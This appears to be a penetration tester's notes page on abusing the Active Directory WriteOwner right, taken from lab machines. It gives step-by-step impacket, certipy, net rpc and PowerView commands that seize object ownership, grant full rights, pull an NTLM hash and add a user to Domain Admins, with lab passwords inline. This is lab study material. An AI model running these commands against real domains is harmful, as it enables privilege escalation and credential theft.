
This ACL allows a user to change the owner of an Active Directory object.

---
## Remotely

#### Write on Service Account

1. Becoming the owner of service account "ca_svc". Now user "ryan" (current user) owns this service account.

```
/usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

2. Giving GenericAll for "ryan" over "ca_svc".

```
/usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

3. Get NTLM Hash for user "ca_svc".

```
certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 
```
#### Write on Group

1. Utilize impacket-owneredit to modify the owner of the AD Object (Management Group)

```
impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
```

2. Add rights to current user "judith.mader" to add users:

```
impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

3. Add judith.mader to the Management Group

```
net rpc group addmem Management judith.mader -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

4. Verify if user judith.mader is inside the Management Group now:

```
net rpc group members Management -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```

---
## Internally Windows Abuse

She seems to have another ACL "WriteOwner" on the Domain Admins Group. We'll need to utilize PowerView.ps1 function's again, specifically Set-DomainObjectOwner.

Let's therefore import PowerView.ps1 again.

```
upload /opt/tools/PowerView.ps1
. .\PowerView.ps1
```

I’ll import PowerView and then assign maria as the owner of the group:

```
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
```

As owner, maria can give maria full rights over the group:

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
```

Now maria can add themself to the group:

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

Verify if it worked:

```
net user maria
```

We now need to close our evil-winrm session and connect to it again for the changes to take place.

```
evil-winrm -i object.local -u maria -p 'W3llcr4ft3d_4cls'
```